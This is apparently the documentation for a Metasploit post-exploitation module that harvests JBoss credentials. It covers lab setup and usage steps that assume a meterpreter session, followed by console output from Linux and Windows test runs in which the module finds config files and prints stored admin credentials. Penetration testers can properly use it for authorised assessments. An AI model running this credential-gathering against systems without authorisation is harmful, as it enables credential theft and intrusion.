## Creating A Testing Environment
  For this module to work you need a linux or windows machine.
  For linux and windows you can download jboss from here the following location: http://jbossas.jboss.org/downloads

This module has been tested against:

  1. Xubuntu 16.04 with jboss 4.23,5.0,5.1 and 6.1.
  2. Windows 10 with jboss 4.23,5.0,5.1 and 6.1.

This module was not tested against, but may work against:

  1. Other versions of linux running jboss 
  2. Other version of windows running jboss

## Verification Steps

  1. Start msfconsole
  2. Obtain a meterpreter session via whatever method
  3. Do: 'use post/multi/gather/jboss_gather'
  4. Do: 'set session #'
  5. Do: 'run'

## Scenarios

### Xubuntu 16.04 with jboss 4.23 and 5.1

#### Running with read permissions

    msf post(jboss_gather) > use post/multi/gather/jboss_gather 
    msf post(jboss_gather) > run

    [*] [2017.03.31-15:12:34] Unix OS detected, attempting to locate Jboss services
    [*] [2017.03.31-15:12:35] Found a Jboss installation version: 4
    [*] [2017.03.31-15:12:36] Attempting to extract Jboss service ports from: /home/reaper/jboss-4.2.3.GA/server/all/deploy/jboss-web.deployer/server.xml
    [*] [2017.03.31-15:12:36] Attempting to extract Jboss service ports from: /home/reaper/jboss-4.2.3.GA/server/default/deploy/jboss-web.deployer/server.xml
    [+] [2017.03.31-15:12:36] Credentials found - Username: admin Password: admin
    [+] [2017.03.31-15:12:37] Credentials found - Username: admin Password: admin
    [*] [2017.03.31-15:12:38] Found a Jboss installation version: 5
    [*] [2017.03.31-15:12:39] Attempting to extract Jboss service ports from: /home/reaper/jboss-5.1.0.GA/server/all/conf/bindingservice.beans/META-INF/bindings-jboss-beans.xml
    [*] [2017.03.31-15:12:39] Attempting to extract Jboss service ports from: /home/reaper/jboss-5.1.0.GA/server/default/conf/bindingservice.beans/META-INF/bindings-jboss-beans.xml
    [*] [2017.03.31-15:12:40] Attempting to extract Jboss service ports from: /home/reaper/jboss-5.1.0.GA/server/minimal/conf/bindingservice.beans/META-INF/bindings-jboss-beans.xml
    [*] [2017.03.31-15:12:40] Attempting to extract Jboss service ports from: /home/reaper/jboss-5.1.0.GA/server/standard/conf/bindingservice.beans/META-INF/bindings-jboss-beans.xml
    [*] [2017.03.31-15:12:40] Attempting to extract Jboss service ports from: /home/reaper/jboss-5.1.0.GA/server/web/conf/bindingservice.beans/META-INF/bindings-jboss-beans.xml
    [+] [2017.03.31-15:12:41] Credentials found - Username: admin Password: admin
    [+] [2017.03.31-15:12:41] Credentials found - Username: admin Password: admin
    [+] [2017.03.31-15:12:41] Credentials found - Username: admin Password: admin
    [+] [2017.03.31-15:12:41] Credentials found - Username: admin Password: admin
    [*] Post module execution completed

### Windows 10 with jboss 5.0 and 6.1

#### Running with low permissions

    msf post(jboss_gather) > run

    [*] [2017.03.31-15:13:43] Windows OS detected, enumerating services
    [*] [2017.03.31-15:13:43] No Jboss service has been found
    [*] Post module execution completed

#### Running with correct permissions
    msf post(jboss_gather) > use post/multi/gather/jboss_gather 
    msf post(jboss_gather) > run

    [*] [2017.03.31-15:44:37] Windows OS detected, enumerating services
    [*] [2017.03.31-15:44:39] Jboss service found
    [*] [2017.03.31-15:44:39] Jboss service found
    [*] [2017.03.31-15:44:39] Found a Jboss installation version: 5
    [*] [2017.03.31-15:44:41] Attempting to extract Jboss service ports from: C:\Users\Reaper\Desktop\jboss-5.1.0.GA\jboss-5.1.0.GA\server\all\conf\bindingservice.beans\META-INF\bindings-jboss-beans.xml
    [*] [2017.03.31-15:44:41] Attempting to extract Jboss service ports from: C:\Users\Reaper\Desktop\jboss-5.1.0.GA\jboss-5.1.0.GA\server\default\conf\bindingservice.beans\META-INF\bindings-jboss-beans.xml
    [*] [2017.03.31-15:44:42] Attempting to extract Jboss service ports from: C:\Users\Reaper\Desktop\jboss-5.1.0.GA\jboss-5.1.0.GA\server\minimal\conf\bindingservice.beans\META-INF\bindings-jboss-beans.xml
    [*] [2017.03.31-15:44:42] Attempting to extract Jboss service ports from: C:\Users\Reaper\Desktop\jboss-5.1.0.GA\jboss-5.1.0.GA\server\standard\conf\bindingservice.beans\META-INF\bindings-jboss-beans.xml
    [*] [2017.03.31-15:44:43] Attempting to extract Jboss service ports from: C:\Users\Reaper\Desktop\jboss-5.1.0.GA\jboss-5.1.0.GA\server\web\conf\bindingservice.beans\META-INF\bindings-jboss-beans.xml
    [+] [2017.03.31-15:44:43] Credentials found - Username: admin Password: admin
    [+] [2017.03.31-15:44:44] Credentials found - Username: admin Password: admin
    [+] [2017.03.31-15:44:44] Credentials found - Username: admin Password: admin
    [+] [2017.03.31-15:44:44] Credentials found - Username: admin Password: admin
    [*] [2017.03.31-15:44:45] Found a Jboss installation version: 6
    [*] [2017.03.31-15:44:46] Attempting to extract Jboss service ports from: C:\Users\Reaper\Desktop\jboss-6.1.0.Final\server\all\conf\bindingservice.beans\META-INF\bindings-jboss-beans.xml
    [*] [2017.03.31-15:44:47] Attempting to extract Jboss service ports from: C:\Users\Reaper\Desktop\jboss-6.1.0.Final\server\default\conf\bindingservice.beans\META-INF\bindings-jboss-beans.xml
    [*] [2017.03.31-15:44:48] Attempting to extract Jboss service ports from: C:\Users\Reaper\Desktop\jboss-6.1.0.Final\server\jbossweb-standalone\conf\bindingservice.beans\META-INF\bindings-jboss-beans.xml
    [*] [2017.03.31-15:44:48] Attempting to extract Jboss service ports from: C:\Users\Reaper\Desktop\jboss-6.1.0.Final\server\minimal\conf\bindingservice.beans\META-INF\bindings-jboss-beans.xml
    [*] [2017.03.31-15:44:49] Attempting to extract Jboss service ports from: C:\Users\Reaper\Desktop\jboss-6.1.0.Final\server\standard\conf\bindingservice.beans\META-INF\bindings-jboss-beans.xml
    [+] [2017.03.31-15:44:49] Credentials found - Username: admin Password: admin
    [+] [2017.03.31-15:44:49] Credentials found - Username: admin Password: admin
    [+] [2017.03.31-15:44:50] Credentials found - Username: admin Password: admin
    [+] [2017.03.31-15:44:50] Credentials found - Username: admin Password: admin
    [*] Post module execution completed